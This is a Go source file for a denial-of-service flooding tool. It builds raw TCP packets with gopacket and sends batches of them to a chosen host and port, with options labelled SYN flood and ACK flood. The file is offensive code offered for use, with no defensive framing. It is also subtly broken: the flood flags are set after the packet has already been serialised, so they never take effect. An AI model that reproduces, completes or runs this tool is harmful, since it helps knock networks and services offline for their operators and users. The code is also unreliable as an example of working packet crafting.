package attack

import (
	"log"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/examples/util"
	"github.com/google/gopacket/layers"
	"golang.org/x/net/ipv4"
)

type DDOS struct {
	host             string
	port             int16
	packetbatchcount int64
	attackType       string
}

func (a *DDOS) Attack() {
	defer util.Run()()

	var srcIP, dstIP net.IP
	var srcIPstr string = "127.0.0.1"
	var dstIPstr string = a.host

	srcIP = net.ParseIP(srcIPstr)
	if srcIP == nil {
		log.Printf("non-ip target: %q\n", srcIPstr)
	}
	srcIP = srcIP.To4()
	if srcIP == nil {
		log.Printf("non-ipv4 target: %q\n", srcIPstr)
	}

	dstIP = net.ParseIP(dstIPstr)
	if dstIP == nil {
		log.Printf("non-ip target: %q\n", dstIPstr)
	}
	dstIP = dstIP.To4()
	if dstIP == nil {
		log.Printf("non-ipv4 target: %q\n", dstIPstr)
	}

	ip := layers.IPv4{
		SrcIP:    srcIP,
		DstIP:    dstIP,
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
	}

	srcport := layers.TCPPort(666)
	dstport := layers.TCPPort(a.port)
	tcp := layers.TCP{
		SrcPort: srcport,
		DstPort: dstport,
		Window:  1505,
		Urgent:  0,
		Seq:     11050,
		Ack:     0,
		ACK:     false,
		SYN:     false,
		FIN:     false,
		RST:     false,
		URG:     false,
		ECE:     false,
		CWR:     false,
		NS:      false,
		PSH:     false,
	}

	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	tcp.SetNetworkLayerForChecksum(&ip)

	ipHeaderBuf := gopacket.NewSerializeBuffer()
	err := ip.SerializeTo(ipHeaderBuf, opts)
	if err != nil {
		log.Fatal("Error while serializing data")
	}
	ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
	if err != nil {
		log.Fatal("Error while parsing header")
	}

	tcpPayloadBuf := gopacket.NewSerializeBuffer()
	payload := gopacket.Payload([]byte("hola"))
	err = gopacket.SerializeLayers(tcpPayloadBuf, opts, &tcp, payload)
	if err != nil {
		log.Fatal("Error while serializing data")
	}

	var packetConn net.PacketConn
	var rawConn *ipv4.RawConn
	packetConn, err = net.ListenPacket("ip4:tcp", "127.0.0.1")
	if err != nil {
		log.Fatal("Error while listening for connection")
	}
	rawConn, err = ipv4.NewRawConn(packetConn)
	if err != nil {
		log.Fatal("Error while sending raw packet")
	}
	if a.attackType == "1" {
		tcp.SYN = true
		// SYN Flood -> 1
	} else if a.attackType == "2" {
		tcp.ACK = true
		// ACK Flood -> 2
	}
	for j := 0; j < int(a.packetbatchcount); j++ {
		for i := 0; i < 50; i++ {
			err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil)
			if err != nil {
				log.Fatal("Error while send data")
			}
		}
	}
}
